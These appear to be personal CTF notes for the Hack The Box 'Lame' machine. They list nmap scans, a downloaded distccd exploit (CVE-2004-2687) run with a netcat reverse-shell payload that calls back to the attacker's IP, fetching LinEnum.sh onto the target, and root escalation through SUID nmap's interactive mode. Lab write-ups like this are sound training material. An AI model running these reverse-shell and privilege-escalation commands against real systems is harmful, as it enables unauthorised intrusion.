Lame
========================

## Enumeration

    sudo nmap_enum lame.htb | tee nmap_output.txt

![qownnotes-media-QTYpLS](../../../media/qownnotes-media-QTYpLS.png)
    
    sudo nmap -p- -Pn -T5 -n lame.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-QcPqMT](../../../media/qownnotes-media-QcPqMT.png)

    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn lame.htb | tee nmap_udp_output.txt

![qownnotes-media-xicthD](../../../media/qownnotes-media-xicthD.png)

    sudo nmap -sS --script vuln -n -T5 -Pn lame.htb -p 21,22,139,445,3632 | tee nmap_vulns.txt

![qownnotes-media-kIGSvx](../../../media/qownnotes-media-kIGSvx.png)

    wget https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/261b638bb05d02b67b6ad67fa9cf3c74a73de6c6/distccd_rce_CVE-2004-2687.py

    searchsploit vsftpd 2.3.4

![qownnotes-media-DxUQZF](../../../media/qownnotes-media-DxUQZF.png)


## Exploitation

    nc -nlvp 1403

    python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.17 1403 -e /bin/bash"
    
    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm

CTRL + Z

    stty raw -echo; fg
    reset

## PrivEsc

    python -m http.server 80
    
    wget http://10.10.14.17/4-privilege_escalation/LinEnum.sh
    
    chmod +x LinEnum.sh
    ./LinEnum.sh
 
![qownnotes-media-KPUoLb](../../../media/qownnotes-media-KPUoLb.png)

![qownnotes-media-qjiozK](../../../media/qownnotes-media-qjiozK.png)


suid nmap

    /usr/bin/nmap --interactive
    !whoami
    !sh

![qownnotes-media-BMAeCa](../../../media/qownnotes-media-BMAeCa.png)


